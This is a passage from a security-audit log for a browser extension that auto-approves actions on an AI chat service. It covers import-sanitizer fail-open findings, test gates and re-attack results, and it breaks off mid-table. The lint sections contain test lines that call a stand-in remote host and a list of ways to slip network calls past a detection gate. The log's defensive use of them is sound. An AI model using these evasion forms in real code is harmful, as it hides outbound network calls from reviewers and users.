- **Repro (executed):** `node probe_import_v19.mjs extension/stats.js` →
  `SA-2(v1.8/v1.9): sanitizer DROPS … {missing:[pauseUntil,dryRun,allowOnceMode,rules,followupSmart,
  followupSchedule,syncSettings,missionEnabled,mission,userLocale,onboarded]}` and
  `a backup of ONLY v1.8/v1.9 keys is reported "Not a backup" (clean === null)`.
- **Impact:** on a **fresh device / after a wipe**, restoring a backup silently loses the user's
  **safety settings** — notably `dryRun:true` (the engine falls back to real clicking),
  `rules.allowTopics` (a restrictive whitelist reverts to "all topics"), custom
  `rules.blockKeywords`, and `pauseUntil` — and the mission state. This is a **fail-open on a
  user-configured restriction** after a documented "replace" restore. (On the *same* device the
  merge semantics of V4-2 keep current values, so the loss only bites when the keys are absent.)
- **Recommended fix (remediation lane, NOT this lane):** add the v1.8/v1.9 keys to `sanitizeBackup`
  with typed validation mirroring the engine's own readers (`rules`/`followupSmart`/
  `followupSchedule` as plain objects with bounded keys; `pauseUntil` finite ≥ 0; `dryRun`/
  `allowOnceMode`/`syncSettings`/`missionEnabled` booleans; `mission` via the engine's
  `sanitizeMission` shape; `userLocale` ∈ `LOCALE_IDS ∪ {auto}`), and keep `seen` counting them.
- **Status: FIXED (S12 remediation lane).** `extension/stats.js` `sanitizeBackup` now accepts the
  v1.8/v1.9 keys with typed validation that MIRRORS the engine's own readers (content.js
  `applyV18Settings`/`sanitizeMission`, popup.js `applyV18UI`, background.js `syncSettings`):
  booleans strict (`dryRun`/`allowOnceMode`/`syncSettings`/`missionEnabled`/`onboarded`);
  `pauseUntil` a finite number, clamped ≥ 0; `rules` a plain object with `allowTopics`
  (cap 50 × 64 chars) / `blockKeywords` (cap 500) string arrays; `followupSmart` a plain object
  (finite `stuckMin` ≤ 1440, non-empty string `stuckPrompt`/`errorPrompt` ≤ 600, boolean
  `errorRecovery`); `followupSchedule` a plain object (boolean `enabled`/`onlyActiveTab`,
  integer 0–23 `start`/`end`); `mission` validated to the engine's `sanitizeMission` shape
  (shipped id only, `step`/`cycles` clamped to the 12/3 caps, finite timestamps); and
  `userLocale` ∈ `LOCALE_IDS ∪ {'auto'}`. Every accepted key counts toward `seen`, so a file of
  ONLY those keys imports. A present-but-invalid value is DROPPED (never emitted as a
  reset-to-default) so a crafted file cannot use junk to CLEAR a user restriction. Every
  pre-existing rule (typed whitelist, decrypt-proof/adopt-or-refuse, caps, quota message) is
  untouched.
- **Proof (S12):** `test/import-security.mjs` (now **50 checks, 0 failed**, exit 0) adds
  (a) an export→import round-trip of all 11 keys byte-for-byte with types preserved;
  (b) a v1.8/v1.9-ONLY file that imports (no "Not a backup" refusal, `dryRun` applied);
  (c) tamper cases — `rules` a string / an unknown mission id / `userLocale:'xx'` /
  `pauseUntil:'soon'` / `dryRun:'true'` dropped; `pauseUntil:-5`→0; `stuckMin:1e9`→1440;
  `start:99` dropped; `mission{step:999,cycles:999}`→`{step:5,cycles:3}`; `startedAt:-1`→now;
  `__proto__`-bearing objects do not pollute `Object.prototype`; plus a **mirror guard** asserting
  stats.js `MISSION_STEPS`/`LOCALE_IDS` equal content.js `MISSION_CORPUS`/popup.js `LOCALE_IDS`.
  **Falsification:** stripping the two new blocks from a mutated copy
  (`stats_nov19keys.js`) turns **13** of the new assertions RED (exit 2) while the shipped file is
  **50/50 green** (§10.1).
- **Status at `10e0e07` (S13 re-attack): PARTIALLY_FIXED.** The whitelist lag itself **is**
  closed (S13 evidence, own probes): an 11-key v1.8/v1.9 config round-trips, and a file of ONLY
  `followupSchedule`+`missionEnabled`+`mission`+`userLocale` imports **end-to-end through the real
  handler** (no "Not a backup", `missionEnabled`/`userLocale`/mission state applied, schedule
  applied at boot). **BUT** the fix's third stated invariant — *"a present-but-INVALID value is
  DROPPED (never emitted as a reset-to-default) so a crafted file cannot use junk to CLEAR a user
  restriction"* — is **falsified** for the three CONTAINER keys (`rules`, `followupSmart`,
  `followupSchedule`): the sanitizer emits a partially/fully-empty container whenever the container
  is present as an object, which **overwrites** the stored container, so the engine's next boot
  resets the missing sub-keys to their defaults. 13 of my 16 crafted files clear a restriction
  (allowTopics whitelist / custom blockKeywords / the send-window schedule / the smart config); the
  pre-fix blob (`9e6b151`, stats.js `a47da7aa…`) clears **NONE** of them → a new fail-open
  introduced by the remediation. **New finding: F-V19-5 (MEDIUM), §13.3.** The scalar keys
  (`dryRun`/`pauseUntil`/`userLocale`/booleans) and `mission` **do** behave as claimed (dropped,
  never reset) — verified.

### F-V19-2 — **LOW** · The "zero-network" lint gate is blind to the aliased `fetch`
- **Class:** assurance-gate false-negative (supply chain / no-remote-primitive invariant).
- **File:line:** `scripts/lint.mjs:83` (`REMOTE_CODE` regexes) vs `extension/popup.js:21`
  (`const readAsset = globalThis.fetch.bind(globalThis);`) and its only call site
  `extension/popup.js:25` (`readAsset(chrome.runtime.getURL(...))`).
- **Issue:** the lint pattern is `/\bfetch\s*\(/`. `fetch.bind(` does **not** match (`.bind`
  intervenes), so the extension now calls `fetch()` (via `readAsset`) while `node scripts/lint.mjs`
  still reports **"no remote code"**. The code comment even acknowledges the intent ("bound once so
  `scripts/lint.mjs`'s remote-primitive ban keeps its meaning") — but the ban is not actually
  enforced for the alias. A future edit could point `readAsset`/a similar alias at a remote URL and
  the gate would stay green.
- **Repro (executed):** `node -e '… REMOTE_CODE.some(r=>r.test(src))'` on `extension/popup.js` →
  `lint flags popup.js: false`, while `fetch.bind present: true`, `readAsset call: true`.
- **Impact:** the product's headline "zero network" property is **not mechanically enforced** any
  more; today there is no reachable remote URL (the call is `chrome.runtime.getURL` of a fixed
  `LOCALE_IDS` entry), so this is a **gate weakness, not an active vulnerability**.
- **Recommended fix:** extend `REMOTE_CODE` (or add a rule) to flag `\.fetch\b`, `globalThis.fetch`,
  `window.fetch`, and any bare `readAsset(`/aliased-call pattern; and add a lint assertion that the
  only `fetch`-family call site passes a `chrome.runtime.getURL(...)` argument. (Also add a
  regression assertion so a remote URL cannot be passed.)
- **Status: FIXED (S12 remediation lane).** `scripts/lint.mjs` gains a shared
  `fetchFamilyFindings()` check (run alongside the original `REMOTE_CODE` rules): the only allowed
  fetch-family form is the alias binding `<g>.fetch.bind(<g>)` (`g` ∈
  globalThis|window|self|global), and EVERY call of that alias must pass a
  `chrome.runtime.getURL(...)` argument; any bare `fetch(...)`, any other `.fetch` reference, or an
  alias call with a different argument is flagged. The shipped
  `globalThis.fetch.bind(globalThis)` + `readAsset(chrome.runtime.getURL(...))` pair is explicitly
  allowed — no false positive anywhere in the package. A `--self-test` mode encodes the three
  cases so the gate can prove itself.
- **Proof (S12):** `node scripts/lint.mjs` stays **exit 0** ("lint OK — 24 checks across 18 files");
  `node scripts/lint.mjs --self-test` → **all 3 cases PASS**. **Falsification (real package copy):**
  a copy of `extension/` with `fetch('https://evil.example')` appended ⇒ **exit 1**
  ("forbidden primitive /\bfetch\s*\(/" + "bare fetch( call"); the copy with
  `readAsset('https://evil.example')` ⇒ **exit 1** ("aliased fetch without a same-package URL");
  the restored copy ⇒ **exit 0** (§10.1).
- **Status at `10e0e07` (S13 re-attack): PARTIALLY_FIXED.** The **reported defect is closed** —
  my own catalogue re-ran the real gate on a real copy of the package: the approved binding + a
  `chrome.runtime.getURL(...)` argument stays clean (no false positive), while an alias re-pointed
  at a remote URL and an alias called with no argument are both flagged. **BUT** the *class* the
  recommendation named is still evadable by one token: `const rf = globalThis.fetch;`
  (no `.bind(`) is **not** tracked, so `rf('https://evil.example')` keeps the gate at **exit 0**
  — likewise `window['fetch'](…)`, `const {fetch: f} = window`, `navigator.sendBeacon`,
  `new EventSource`, `new Image().src`, `import('https://…')`, a remote `<script src>` built in a
  `.js` file, and `(0,eval)('fetch')`. 13 of my 19 attack forms are MISSED with the gate green
  (§13.4, with the caught / missed-but-unreachable / real-gap classification). None of the missed
  forms exists anywhere in the shipped package today (verified by repo-wide grep).

### F-V19-3 — **INFO** · Adaptive fast-path sweep reduces the card-mutation settle window to ~0 ms
- **Class:** reliability / TOCTOU (Chain I).
- **File:line:** `extension/content.js:132-133` (`OBSERVER_CARD_MS = 0`), `:1624-1653`
  (`cardBearingMutation` → `scheduleSweep('observer', fast ? 0 : 120, fast)`).
- **Issue:** a card-bearing mutation now triggers the sweep on the **next task** instead of after
  the 120 ms generic debounce. The repo's falsification (§12.4) and my re-run show the **same**
  e2e outcome with the fast path on/off (`n7count:1`, `n11count:1`, `denyCount:0`,
  `forbiddenHit:[]`), so detection is unchanged for the fixture. **Residual:** a card that renders
  *and mutates within the same task* could be evaluated in a transient state; bounded by the
  click-time rails.
- **Status:** `NOT_VERIFIED` beyond the fixture (no fault-injection probe). **No fix recommended**
  (latency is the product's core loop; the rails re-evaluate at click time).

### F-V19-4 — **INFO** · Mission / follow-up caps are per content-script instance (F4 lineage)
- **Class:** multi-frame amplification (Chain G/H residual).
- **File:line:** `extension/content.js:1278-1285` (per-instance `followup.attempts`), `:948-966`
  (per-instance mission `step`/`cycles`), manifest `all_frames:true`.
- **Issue:** with `all_frames:true`, each muse.ai frame runs its own engine; the rolling-hour cap
  and the 12/3 mission caps are enforced on **that instance's** in-memory state. A page rendering
  the composer + idle status in N frames could in principle multiply sends up to N×12 — the same
  limitation already **accepted as F4** for the follow-up cap.
- **Status:** `SOURCE_REVIEWED`; multi-frame multiplication `NOT_VERIFIED` (the suites run
  single-frame). **No fix recommended** unless Muse ships multi-frame chat.

**No P0/P1 new findings.** The only new finding above INFO is **F-V19-1 (MEDIUM)**.

---

## 10. GATES — RESULTS (verbatim, run foreground/unpiped this lane)

```
node scripts/lint.mjs                 exit 0  "lint OK — 24 checks across 18 files (syntax, JSON, i18n parity, no remote code, minimal permissions)"
python scripts/verify-zip.py          exit 0  "muse-auto-allow-v1.9.1.zip: 18 matched, 0 mismatched, 0 disk-only, 0 zip-only"
sha256sum dist/…v1.9.1.zip            eec91d1d8f16005e2f34a748145d7a7d32c04b7d85f8ada267255fdb0ac8d1d8  (180,069 B)
node test/e2e.mjs                     exit 0  ok:true; forbiddenHit:[]; denyCount:0; connectorCheck.ok:true (blockedConnector:2); n7=1; n11=1; encCheck.ok:true; statsPage.ok:true; locksProbe:true
node test/followup-e2e.mjs            exit 0  ok:true (z-checks: fixture no JS errors; deny never clicked)
node test/mission-e2e.mjs             exit 0  ok:true; 39 checks, 0 failed; verifyTimeouts:[]; preflight corpus 4 ids / 18 steps / flagged:[] / controlPositive:2 / controlNegative:0
node test/lang-switch-e2e.mjs         exit 0  passed:36, failed:0
node test/background-unit.mjs         exit 0  total:29, failed:0 (manifest/badge/commands/digest/sync/migrate)
node test/import-security.mjs         exit 0  total:29, failed:0
node scripts/bench/experience.mjs --only=assert   exit 0  pass:22, fail:0
```

**Independent probes (this lane, scratch `…/cache/scratch/maa_v19_audit/`):**

```
probe_import_v19.mjs  → 13/13 PASS  (bound stats.js a47da7aa…)   SA-1 fixed; SA-2 v1.7 fixed; NEW whitelist lag F-V19-1; SA-3 fixed; proto/whitelist clean
probe_mission_v19.mjs → 18/18 PASS  (bound content.js 92fc5563…)  caps enforced on stored values; corpus-only text; unknown id fail-closed
probe_xss_v19.mjs     → CLEAN        (bound popup.js 0aca8929…)   real renderLog + Python html.parser: {b,div,span}, 0 handlers, 0 dangerous tags
stats topics render   → CLEAN        (Python html.parser on the verbatim renderTopics expressions)
```

**Environment:** Windows 11, git-bash/MSYS, Node **v26.7.0**, installed Chrome (CDP
`Extensions.loadUnpacked`, **scratch profile — the user profile was never touched**). Zero-dependency
repo; no bootstrap needed. The Chrome suites ran **foreground/unpiped** and returned real JSON
(exit 0). No suite failed. (Note: `[ -t 0 ]` reports the shell is not a TTY, yet the suites ran —
recorded so the "non-TTY kills Chrome suites" caveat is not over-generalized here.)

---

## 10.1 S12 REMEDIATION — GATE RE-RUN + FALSIFICATIONS (F-V19-1 + F-V19-2 FIXED)

Post-fix working tree (v1.9.1 + S12; `FIXED_ON` = this revision). All gates run
foreground/unpiped:

```
node scripts/lint.mjs                             exit 0  "lint OK — 24 checks across 18 files (syntax, JSON, i18n parity, no remote code, minimal permissions)"
node scripts/lint.mjs --self-test                 exit 0  "all 3 cases PASS"
node test/import-security.mjs                     exit 0  total:50, failed:0
node test/e2e.mjs                                 exit 0  ok:true; forbiddenHit:[]; denyCount:0; connectorCheck.ok:true (blockedConnector:2); encCheck.ok:true; statsPage.ok:true; locksProbe:true
node test/followup-e2e.mjs                        exit 0  ok:true (the nested ok:false = the EXPECTED 'paused' / 'composer-not-empty' engine refusals)
node test/lang-switch-e2e.mjs                     exit 0  passed:36, failed:0
node test/background-unit.mjs                     exit 0  total:29, failed:0
node test/mission-e2e.mjs                         exit 0  ok:true; 39 checks, 0 failed; verifyTimeouts:[]
node scripts/bench/experience.mjs --only=assert   exit 0  pass:22, fail:0
```

Reverse-mutation falsifications:

```
import-security on a mutated stats.js (both new blocks removed)      → 13 new F-V19-1 assertions RED, exit 2
lint --self-test (shipped / +fetch(remote) / readAsset(remote))      → PASS / PASS / PASS
lint on a mutated package copy  + fetch('https://evil.example')      → exit 1 (forbidden primitive + bare fetch( call)
lint on a mutated package copy  + readAsset('https://evil.example')  → exit 1 (aliased fetch without a same-package URL)
lint on the restored package copy                                    → exit 0
```

Files changed by S12: `extension/stats.js`, `scripts/lint.mjs`, `test/import-security.mjs`,
this document. `VERIFIED_ON` remains for the S13 independent re-attack lane — no PASS here is a
re-attack.

---

## 11. RESIDUAL / ACCEPTED RISKS (explicit)

1. **R8–R11 — delegated-approval impersonation (CORE, accepted).** A compromised Muse
   account/session + default-ON auto-allow ⇒ attacker-queued approvals are granted. The extension
   cannot distinguish genuine vs forged approval cards. Mitigations: visible toggle, audit log,
   rate cap, never-Deny, pause, rules, connector block. **Owner decision:** first-run consent.
2. **R-1 — crafted self-consistent backup still rotates the at-rest key** (no authenticity without
   signing). Requires the user to pick + confirm the file. `INDEPENDENTLY_VERIFIED`.
3. **V4-2 / R-4 — import merge semantics + import outside the page Web Lock** (last-writer-wins on
   a concurrent flush; restore keeps absent keys). Accepted.
4. **Chain D — at-rest confidentiality is bounded by the OS-user boundary** (the AES-GCM key sits in
   the same profile; "casual inspection" only). Accepted.
5. **Chain E — update-channel trust** (unpacked dir = the user's machine; CWS-default provenance
   only; no signing/reproducible build). Accepted; owner TODOs: CWS 2FA + hash-verify before upload.
6. **F4 lineage — per-instance (per-frame) caps** with `all_frames:true` (Chain G/H); the v1.9
   mission caps inherit the same limitation. Bounded; `NOT_VERIFIED` for multi-frame multiplication.
7. **F-V19-3 — the fast-path sweep's ~0 ms card settle window** (Chain I); detection unchanged on
   the fixture, `NOT_VERIFIED` beyond it.
8. **Settings-sync is account-bound.** The mirror can seed `followupEnabled`/`followupPrompts`/
   `rules` from the user's own Google sync **on absent local keys** — i.e. a fully compromised
   Google account could set an attacker prompt on a fresh device. The **mission keys are NOT in the
   sync subset** (a synced account cannot start a mission or inject mission text). Accepted
   (account boundary, documented in `store/PRIVACY.md` §2).
9. **Muse ToS tension (legal/product, not technical).** `docs/MUSE_TOS_RESEARCH.md` rates the
   blanket auto-approver **MEDIUM** against Muse ToS §7.6 ("meaningful human oversight"). A scoped
   design (rules/blocklist/topic whitelist, dry-run, schedule, never-Deny, connector block) reduces
   the tension. Owner/legal decision; out of technical scope.
10. **Paid path** = `NOT_VERIFIED` (nothing exists). Any future monetization must pass the S9–S11
    design gate first.

---

## 12. VERDICT (honest — S14/S15 rails)

- **Security assurance for a FREE go-live: GO-equivalent, with one MEDIUM + one LOW + two INFO
  findings open (this is an AUDIT, not a remediation verdict).** At the frozen revision `9e6b151`
  the shipped rails bind under real-Chrome suites and independent probes: never a Deny, never a lone
  Allow, connector hard-block, consent/permission-card block, encrypted at-rest log, zero network,
  zero deps, byte-verified artifact, and the new v1.9 Mission Orchestrator is **fail-closed** —
  shipped-corpus-only text, advance-on-verified-send-only, caps (12/3) enforced on **stored** values,
  unknown ids ⇒ no mission.
- **CONDITIONAL items (owner TODO list):** (a) extend the import sanitizer whitelist to the
  v1.8/v1.9 keys (F-V19-1) — **FIXED (S12)**, see §9 + §10.1; (b) close the lint zero-network
  blind spot (F-V19-2) — **FIXED (S12)**, see §9 + §10.1; (c) owner
  decision on Chain F first-run consent; (d) CWS 2FA + hash-verify-before-upload; (e) owner/legal
  decision on the Muse ToS §7.6 tension.
- **Paid-path readiness: `NOT_VERIFIED`** — there is no payment/provider/webhook/entitlement/ledger
  to verify (§7). **`PAID_GO` is not claimable** while the paid surface is N/A.
- **Never claim more.** This audit did **not** fix anything, did **not** re-run the S12 remediation
  or the S13 independent re-attack (separate lanes), and does **not** attest the artifact beyond the
  byte-verify + suites recorded in §10. `FIXED_ON`/`VERIFIED_ON` SHAs remain for those lanes.

**PHASE STATUS: AUDIT COMPLETE at `9e6b151` (v1.9.1) — remediation (S12) + independent re-attack
(S13) + rebind at the post-fix revision are required before any GO verdict is issued.**

### 12.1 S13 RE-BIND AT THE POST-FIX REVISION `10e0e07` (this lane's verdict — §13)

- **F-V19-1 (MEDIUM, was fail-open) → `PARTIALLY_FIXED`.** The whitelist lag is closed (a
  v1.8/v1.9-only backup now imports end-to-end); the fix's "junk cannot CLEAR a restriction"
  invariant holds for the scalar keys and `mission` but **fails for the three container keys** →
  NEW **F-V19-5 (MEDIUM)**, a fail-open introduced by the remediation (pre-fix: 0 crafted files
  cleared a restriction; post-fix: 13/16 do).
- **F-V19-2 (LOW, gate false-negative) → `PARTIALLY_FIXED`.** The reported aliased-fetch blind
  spot is closed and self-proven; the fetch-family *class* is still evadable in 13 of my 19 forms
  with the gate green — classified honestly in §13.4 (caught / missed-but-unreachable /
  missed-and-real-gap). The gate was **not** weakened; the package is unchanged and green.
- **NEW F-V19-6 (LOW)** — the `LOCALE_IDS` mirror guard is bound to a hardcoded literal, not to
  the shipped locale set → a newly shipped locale drifts silently and the guard stays green.
- **Carried over unchanged:** F-V19-3 (INFO, `NOT_VERIFIED` beyond the fixture) and F-V19-4
  (INFO, multi-frame caps `NOT_VERIFIED`).
- **Free-go-live axis:** unchanged in kind — still GO-equivalent for a FREE launch **only** with
  the open items owned; the new MEDIUM joins the CONDITIONAL list (it needs a sanitizer decision,
  see §13.3 fix direction). **Paid path: `NOT_VERIFIED` / `NOT_APPLICABLE`** (no money path; §7).
- **No old PASS is re-cited:** every gate in §13.6 was re-executed by this lane at `10e0e07`.

> **SUPERSEDED IN PART (S12b round 2, §14):** F-V19-5 and F-V19-6 above are now **FIXED** at the S12b
> revision, and the zero-network gate is hardened for the realistic network forms §13.4 listed. The
> S13 findings and their evidence are preserved verbatim; §14 is the remediation status + proof.

---

## 13. S13 — INDEPENDENT RE-ATTACK AT THE POST-FIX REVISION (`10e0e07`)

**Lane discipline:** maker ≠ judge. Own probes, own vectors — nothing reused from the S12 lane.
Everything lives in a scratch dir (`…/cache/scratch/maa_s13/`); nothing was written to
`extension/**`, `scripts/**`, `test/**`, `store/**`; no git operation was run. The only file this
lane edits is this document.

### 13.0 REVISION BINDING

| Item | Value |
|---|---|
| Repo | `C:/00. AI Project/PRJ_AutoAllowMUSE` (public), branch `main` |
| **HEAD (frozen for S13)** | `10e0e07` — "fix(security): F-V19-1 import sanitizer whitelist + F-V19-2 zero-network gate" |
| Parent (the audit revision) | `9e6b151` (v1.9.1 packet sync) |
| sha256 `extension/stats.js` | `ed84c2516808b1f05a1b7c0e04ca596a4ce93543520624f8281cb15b914d92ea` (S12 changed it; was `a47da7aa…`) |
| sha256 `scripts/lint.mjs` | `924815d98003210e85adf064bdd598644ad93af7e2f9801616d39706ba72d081` (S12 changed it; was `b27792c1…`) |
| sha256 `extension/content.js` | `92fc55638020dfa9d3a702a4eec6b18c12a41527353a10462314c0fb32ab2eb1` (unchanged by S12) |
| sha256 `test/import-security.mjs` | `1b88aa2fbb6c92bfc3d972f4d958417d412619ca88d31476cfaa8f838f838a54` |
| Pre-fix contrast blob | `git show 9e6b151:extension/stats.js` (stats.js `a47da7aa…`), run through the same probe |

**`VERIFIED_ON` = `10e0e07` (S13).** `DISCOVERED_ON` = `9e6b151` (S1). No prior PASS is re-cited.

> **AMENDMENT (S12b round 2, this lane):** the revision this section is bound to, `10e0e07`, was
> **amended to `50436cb`** — the S12 remediation commit was re-committed with the same tree (a
> message/parent rewrite), so `10e0e07` is no longer an ancestor of `main`. The `extension/**`
> blobs are **identical** at both revisions (`extension/stats.js` = `880cf28a…`,
> `scripts/lint.mjs` = `1155107b…`, `test/import-security.mjs` = `adc4785e…`; sha256
> `ed84c251…`/`924815d9…`/`1b88aa2f…`), so **every piece of §13 evidence above stays bound to the
> same content**. Live HEAD is `a89ac0c` (this §13 doc commit) on top of `50436cb`. The F-V19-5 /
> F-V19-6 fixes land on top at §14.

### 13.1 METHOD — three probes, all driven against the REAL frozen code

1. `probe_s13_import2.mjs` — runs the **whole real `extension/stats.js`** in a `vm` with this
   lane's own `chrome`/DOM stubs, so the **real `importFile` `change` handler** is exercised; and
   in a second `vm` it runs the **real engine readers sliced out of `content.js`**
   (`asObj`, `sanitizeList`, `hourOf`, `applyV18Settings`, the `v18` defaults, `MISSION_CORPUS`,
   `sanitizeMission`, `applyMissionSettings`), modelling the engine exactly as
   `content.js:1569` (boot read of `{pauseUntil, dryRun, allowOnceMode, rules, followupSmart,
   followupSchedule, missionEnabled, mission}`) + `:1601-1612` (the per-key `onChanged` patch).
   The "restriction" metric is the conjunction of a user's tightened settings *after a boot*, so a
   clear is only reported when the engine really loses the restriction on its next start.
2. `probe_s13_lint.mjs` — a **real copy** of `scripts/lint.mjs` over a **real copy** of
   `extension/`; for each network/fetch-family form a vector file is added to the copied package
   and the real gate is run (exit code + findings naming the vector file).
3. `probe_s13_mirror.mjs` — a fresh copy of `extension/` + the **real** `test/import-security.mjs`;
   each mirror mutation is applied to the copy only, then the real guard is run.

### 13.2 F-V19-1 — what the fix DID close (own evidence, no S12 vectors reused)

- **All 11 v1.8/v1.9 keys round-trip (own probe `probe_s13_roundtrip.mjs`):** a full config
  (`pauseUntil`, `dryRun`, `allowOnceMode`, `syncSettings`, `missionEnabled`, `onboarded`,
  `userLocale`, `rules`, `followupSmart`, `followupSchedule`, `mission`) → sanitizer keeps all 11
  byte-for-byte (0 misses) → the **real handler** writes all 11 into storage identically (0 misses,
  0 alerts) → the **engine boot** applies them exactly (`dryRun:true`, `pauseUntil` intact,
  `allowTopics`/`blockKeywords` verbatim, `stuckPrompt`/`errorRecovery` intact, schedule
  `{enabled:true,start:9,end:17,onlyActiveTab:true}`, `missionId:'golive-ready' step 2 cycle 1`).
- **v1.8/v1.9-only file imports end-to-end through the REAL handler** — a file of ONLY
  `{followupSchedule:{enabled:true,start:9,end:17,onlyActiveTab:true}, missionEnabled:true,
  mission:{id:'audit-only',step:1,cycles:0,startedAt:1,lastSentAt:0}, userLocale:'ko'}` →
  **0 alerts**, storage gets `missionEnabled:true` + `userLocale:'ko'` + the mission, and the
  engine boot applies `schedule.enabled:true, start:9, end:17` and `missionId:'audit-only',
  step:1`. (On the pre-fix blob the same file is refused as "Not a backup" — the original
  F-V19-1 repro still reproduces there, which is the RED contrast for the fix.)
- **Scalar keys and `mission` behave as the fix claims (dropped, never reset):** `pauseUntil:'soon'`,
  `dryRun:'true'`, `userLocale:'AUTO'/'EN'/'xx'`, `mission:{}`, an upper-case mission id, and a
  mission with extra unknown sub-keys are all either dropped or normalised to the engine's own
  accepted shape; a file of only junk scalars is refused outright (`seen === 0` → `null`), and
  none of them clears the stored value (controls A12/A15/A16 → restriction intact).
- **No prototype pollution:** `__proto__` / `constructor` / `prototype` carriers inside `rules`,
  `followupSmart`, `followupSchedule`, `mission` leave `Object.prototype` untouched.
- **Boundary fuzz vs the engine's accepted domain** (20 cases): the sanitizer is at worst
  *stricter* than the engine, never looser — e.g. `pauseUntil:'1000'` is dropped by the sanitizer
  while the engine would `Number`-coerce it to 1000 (a conservative drop, the stored value is
  preserved); `mission.step:'2'`, `mission.cycles:true`, `schedule.start:'9'`, `start:23.0`,
  `stuckMin:-0` all agree with the engine's own coercion; `allowTopics` caps at 50 × 64 chars and
  `blockKeywords` at 500 exactly as `content.js:149-150/378-388` do; `schedule.end:24` is dropped
  and the engine defaults it to 18 (no divergence in effect). The one non-security asymmetry is
  pre-existing and untouched by this fix: `followupPrompt` is capped at 4000 chars by the
  sanitizer while `content.js:1421` accepts any length.

### 13.3 NEW FINDING **F-V19-5** — **MEDIUM** · the sanitizer's container emission **CLEARS** stored restrictions

- **Class:** import / fail-open on a user restriction (the exact class F-V19-1 was raised for —
  reached through the new code path). A **regression introduced by the S12 remediation** in this
  dimension.
- **File:line:** `extension/stats.js:305-311` (`const rules = plainObj(d.rules); … out.rules = r;
  seen++;`), `:312-320` (`followupSmart`), `:321-329` (`followupSchedule`) — the containers are
  emitted **unconditionally** whenever `plainObj()` returns an object, even when every sub-value
  was rejected. Engine side: `extension/content.js:1569` (boot read with `rules: {}` /
  `followupSmart: {}` / `followupSchedule: {}` defaults) + `:392-420` (`applyV18Settings`'s
  presence test `if ('allowTopics' in rules)`), and the storage overwrite at `stats.js:398`
  (`chrome.storage.local.set(clean)`).
- **Issue:** the fix's stated invariant is *"a present-but-INVALID value is DROPPED (never emitted
  as a reset-to-default) so a crafted file cannot use junk to CLEAR a user restriction."* That
  holds for scalars, but **not** for the three container keys: `rules`/`followupSmart`/
  `followupSchedule` are always emitted as an object when present, so a container whose sub-values
  are junk (or absent) is written into storage as a **partial/empty** object. Because the engine's
  reader is *presence-aware* (`if ('allowTopics' in rules)`), the **missing sub-key** is exactly
  what makes the engine fall back to its default on the next boot — i.e. `allowTopics` → `[]`
  (= no topic restriction), `blockKeywords` → the seed list, `schedule` → `{enabled:false, 8, 18}`,
  `smart` → the shipped prompts with `errorRecovery:false`.
- **Repro (executed, own probe):** a stored state with every v1.8 restriction tightened, then each
  crafted file imported through the **real handler** and the engine booted. **13 of 16 crafted
  files cleared a restriction**; the pre-fix blob cleared **0 of 16**:

  | crafted `data` | sanitizer emitted | engine state after the next boot |
  |---|---|---|
  | `{rules:{allowTopics:"nope"}}` | `{rules:{},schemaVersion:2}` | **allowTopics `[]`** (whitelist gone → every topic allowed); custom `blockKeywords` lost (seed re-applied) |
  | `{rules:{allowTopics:"nope",blockKeywords:["keepme"]}}` | `{rules:{blockKeywords:["keepme"]}}` | **allowTopics `[]`**; blocklist replaced by the file's list |
  | `{rules:{}}` | `{rules:{}}` | **allowTopics `[]`** + custom blocklist lost |
  | `{rules:{allowTopics:[["repo-x"],5,null,{}, "  "]}}` | `{rules:{allowTopics:[]}}` | **allowTopics `[]`** |
  | `{rules:{allowTopics:["repo-x"]}}` (no `blockKeywords`) | `{rules:{allowTopics:["repo-x"]}}` | custom blocklist lost → seed re-applied (fail-closed-ish, still a silent config loss) |
  | `{rules:{blockKeywords:[]}}` | `{rules:{blockKeywords:[]}}` | **blocklist empty → nothing blocked** (note: an empty blocklist is also reachable from the popup UI, so this facet alone is not a new primitive) |
  | `{rules:{"__proto__":{…}}}` / `{rules:{constructor:{…}}}` | `{rules:{}}` | **allowTopics `[]`** (no prototype pollution) |
  | `{followupSchedule:{enabled:"yes"}}` | `{followupSchedule:{}}` | **schedule `{enabled:false,start:8,end:18,onlyActiveTab:false}`** — the send-window restriction is gone |
  | `{followupSchedule:{start:99}}` | `{followupSchedule:{}}` | same — schedule cleared |
  | `{followupSmart:{stuckMin:"x"}}` / `{followupSmart:{errorRecovery:"yes"}}` | `{followupSmart:{}}` | smart config reset to the shipped defaults (user prompts lost, `errorRecovery:false`) |
  | controls `{mission:{}}`, `{pauseUntil:"soon"}`, `{dryRun:"true"}` | `null` → "Not a backup" | **restriction intact** — the asymmetry is specific to the three container keys |

- **Impact:** after a restore the extension can **click approvals for topics the user excluded**
  (`allowTopics` cleared) and **send follow-ups outside the user's schedule window**
  (`schedule.enabled` cleared) — a fail-open on a user-configured restriction, on the next
  content-script boot. Same precondition model as V4-1/F-V19-1: a crafted backup file the user
  picks + one `confirm()`. An **honest** backup is unaffected (popup.js:829 always writes both
  `rules` sub-keys; :888/:901 write whole `followupSchedule`/`followupSmart` objects), so this is
  a crafted/partial-file fail-open, not an honest-backup one.
- **Fix direction (NOT applied here — this lane's write set is this document):** emit a container
  only when it has ≥ 1 accepted sub-key, and preserve the "absent" semantics instead of writing a
  partial object (i.e. drop the container rather than emit an empty one — the engine's `in` test
  is what converts "absent" into "reset to default"); alternatively merge the import at sub-key
  granularity. The `blockKeywords: []` facet should be decided explicitly (the engine honours an
  empty list as "nothing blocked"; `content.js:401`'s comment claims the list "is never
  truncated" yet an empty list unblocks everything).
- **Status: FIXED (S12b remediation round 2, §14).** The sanitizer now emits a container ONLY when
  it carries ≥ 1 ACCEPTED sub-key (an all-rejected/empty container is DROPPED, never written as
  `{}`), and an explicitly-empty `allowTopics`/`blockKeywords` is never imported; in addition the
  three containers are merged at **sub-key granularity** with what is stored before the
  replace-write, so a sub-key the file did not validly provide keeps its STORED value. Proven on the
  **engine's effective post-boot values** (`test/import-security.mjs`, 22 crafted files → 0 clear a
  restriction; the S12 shape measured 19/22 and S13 measured 13/16).
- **Severity rationale:** MEDIUM — the same class and impact as F-V19-1 (fail-open on a user
  safety restriction after a documented "replace" restore), requires the user to import a file,
  and is **newly reachable** at this revision.

### 13.4 F-V19-2 — the gate's real coverage, classified honestly

The real gate (`scripts/lint.mjs`, unmodified) was run over a real copy of the package with one
vector per form. Baseline (no vector): **exit 0**. Controls behave correctly: the approved
`<g>.fetch.bind(<g>)` + `chrome.runtime.getURL(...)` pair is **clean** (no false positive), an
alias called with no argument and an alias re-pointed at a remote URL are both **flagged**.
**13 of 19 attack forms are MISSED with the gate at exit 0.**

| # | vector | gate | classification |
